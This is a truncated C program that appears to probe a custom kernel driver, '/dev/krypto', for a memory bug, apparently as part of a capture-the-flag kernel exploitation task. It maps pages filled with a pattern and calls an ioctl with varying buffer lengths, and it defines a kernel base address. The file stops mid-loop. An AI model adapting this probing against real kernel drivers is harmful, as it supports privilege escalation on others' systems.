#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KRYPTO_RNG_CMD 0x1337
#define KERNEL_BASE 0xffffffff81000000UL

struct rng_params {
    char *buf;
    size_t buf_len;
};

void hexdump(const void* data, size_t size) {
    const unsigned char* p = (const unsigned char*)data;
    for (size_t i = 0; i < size; i++) {
        if (i % 16 == 0) printf("\n%04lx: ", i);
        printf("%02x ", p[i]);
    }
    printf("\n");
}

int main() {
    int fd;
    void *buffer;
    struct rng_params params;

    // Open the device
    fd = open("/dev/krypto", O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    // Allocate multiple pages to try different memory regions
    size_t alloc_size = 4096 * 4; // 4 pages
    buffer = mmap(NULL, alloc_size, PROT_READ | PROT_WRITE, 
                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (buffer == MAP_FAILED) {
        perror("mmap");
        close(fd);
        return 1;
    }

    // Initialize buffer with pattern
    memset(buffer, 0x41, alloc_size);

    // Try different buffer lengths to trigger potential issues
    size_t test_lengths[] = {0x1000, 0x800, 0x400, 0x200};

    for (int i = 0; i < sizeof(test_lengths)/sizeof(test_lengths[0]); i++) {
        params.buf = buffer;
        params.buf_len = test_lengths[i];

        printf("\nTrying buffer length: 0x%lx\n", test_lengths[i]);

        if (ioctl(fd, KRYPTO_RNG_CMD, &params) < 0) {
